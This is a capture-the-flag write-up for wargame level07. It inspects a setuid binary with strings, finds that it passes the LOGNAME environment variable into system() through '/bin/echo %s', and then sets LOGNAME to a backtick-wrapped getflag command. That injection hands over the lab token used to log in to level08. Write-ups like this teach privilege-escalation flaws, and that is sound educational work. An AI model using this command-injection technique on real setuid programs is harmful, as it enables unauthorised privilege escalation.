First let’s do `ls -l`  to see what we have

We find a file `level07` owned by flag07. When we execute it, it returns `level07` as response

We use the command `strings` on the file and find this:

```jsx
/lib/ld-linux.so.2
zE&9qU
__gmon_start__
libc.so.6
_IO_stdin_used
setresgid
asprintf
getenv
setresuid
system
getegid
geteuid
__libc_start_main
GLIBC_2.0
PTRh 
UWVS
[^_]
LOGNAME
**/bin/echo %s** 
;*2$"
GCC: (Ubuntu/Linaro 4.6.3-1ubuntu5) 4.6.3
	gid
	uid
/home/user/level07
/usr/include/i386-linux-gnu/bits
/usr/include
level07.c
types.h
unistd.h
long long int
/home/user/level07/level07.c
__uid_t
envp
long long unsigned int
setresuid
getenv
setresgid
unsigned char
system
GNU C 4.6.3
argc
__gid_t
short unsigned int
main
asprintf
short int
buffer
argv
.symtab
.strtab
.shstrtab
.interp
.note.ABI-tag
.note.gnu.build-id
.gnu.hash
.dynsym
.dynstr
.gnu.version
.gnu.version_r
.rel.dyn
.rel.plt
.init
.text
.fini
.rodata
.eh_frame_hdr
.eh_frame
.ctors
.dtors
.jcr
.dynamic
.got
.got.plt
.data
.bss
.comment
.debug_aranges
.debug_info
.debug_abbrev
.debug_line
.debug_str
.debug_loc
crtstuff.c
__CTOR_LIST__
__DTOR_LIST__
__JCR_LIST__
__do_global_dtors_aux
completed.6159
dtor_idx.6161
frame_dummy
__CTOR_END__
__FRAME_END__
__JCR_END__
__do_global_ctors_aux
level07.c
__init_array_end
_DYNAMIC
__init_array_start
_GLOBAL_OFFSET_TABLE_
__libc_csu_fini
setresuid@@GLIBC_2.0
__i686.get_pc_thunk.bx
data_start
_edata
_fini
geteuid@@GLIBC_2.0
getegid@@GLIBC_2.0
__DTOR_END__
getenv@@GLIBC_2.0
__data_start
system@@GLIBC_2.0
__gmon_start__
__dso_handle
_IO_stdin_used
__libc_start_main@@GLIBC_2.0
__libc_csu_init
_end
_start
_fp_hw
asprintf@@GLIBC_2.0
__bss_start
main
_Jv_RegisterClasses
setresgid@@GLIBC_2.0
_init
```

The interesting lines there are `LOGNAME` followed by`/bin/echo %s`

Now we know the file will execute `/bin/echo` using the env `LOGNAME` as `%s` so let’s exploit it.

Checking env variables using the command `env` we see that LOGNAME is set to level07 so let’s change it to getflag

```jsx
export LOGNAME=\`getflag\`
```

Now we can execute the file again and get the flag to log as the next user

```jsx
./level07
Check flag.Here is your token : fiumuikeil55xe9cu4dood66h
su level08
Password fiumuikeil55xe9cu4dood66h
```